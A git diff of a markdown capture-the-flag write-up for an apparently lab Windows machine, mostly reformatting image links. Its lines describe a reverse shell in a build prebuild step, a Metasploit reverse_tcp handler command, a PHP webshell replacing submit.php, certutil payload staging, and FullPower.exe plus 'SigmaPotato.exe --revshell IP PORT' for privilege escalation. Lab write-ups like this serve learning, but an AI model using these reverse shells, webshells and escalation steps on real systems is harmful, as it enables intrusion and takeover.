@@ -19,8 +19,7 @@ First attempt failed, Reverse shell in the Prebuild is crashing or having some k
 
 Need to change from powershell reverse shell into a MSFpayload with metasploit
 
-![[Pasted image 20231005211129.png]]
-
+![Reverseshell](<attachments/Pasted image 20231005211129.png>)
 Build failed (Sad Trombone)
 But what did work was getting wells correct .sln file.
 
@@ -46,30 +45,34 @@ reverse_tcp; set lhost 10.10.14.4; set lport 9001; exploit"
 ```
 
 
-![[Pasted image 20231005231302.png]]
+![Serverpull](<attachments/Pasted image 20231005231302.png>)
 
 This is the server yanking the files from me and finally executing my staged payload.
 
 Doing some WinPEAS we can find the service XAMPP hosting the webpage we interact with
 
-Doing `C:\ dir /B /S index.php 
+Doing 
+```
+C:\ dir /B /S index.php 
+```
+
 
 We can find the Area for the webpage we have been interacting with
 
-![[Pasted image 20231005231850.png]]
+![IMAGE](<attachments/Pasted image 20231005231850.png>)
 
 
 From here we can replace the submit.php file with a php webshell
 
 From the some of our shells we can use certutil.exe to bring another staged payload to the box, but host it on another port. 
 
-![[Pasted image 20231005232038.png]]
+![img](<Pasted image 20231005232038.png>)
 
 From here we can use the webshell we moved onto the box. Browse to the /submit.php 
 
-![[Pasted image 20231005232132.png]]
+![img](<attachments/Pasted image 20231005232132.png>)
 
-We now have the access level of![[Pasted image 20231005232257.png]]
+We now have the access level of ![img](<attachments/Pasted image 20231005232257.png>)
 
 Nice but not quite what we need. Working with dabois we found FullPower.exe 
 
@@ -79,15 +82,11 @@ On Windows, some services executed as `LOCAL SERVICE` or `NETWORK SERVICE` a
 
 So once we run that we now have the ability to gain SEimpersonate YIPEEE
 
-Now using Tylers WICKED updated SIGMA POTATO
-
-https://github.com/tylerdotrar/SigmaPotato
-
-Which he lovingly built in with a revshell. 
+Now using Tylers WICKED updated SIGMA POTATO https://github.com/tylerdotrar/SigmaPotato Which he lovingly built in with a revshell. 
 
 FullPower.exe; SigmaPotato.exe --revshell IP PORT
 
-![[Pasted image 20231005232627.png]]
+![img](<attachments/Pasted image 20231005232627.png>)
 
 YEEEEE
 
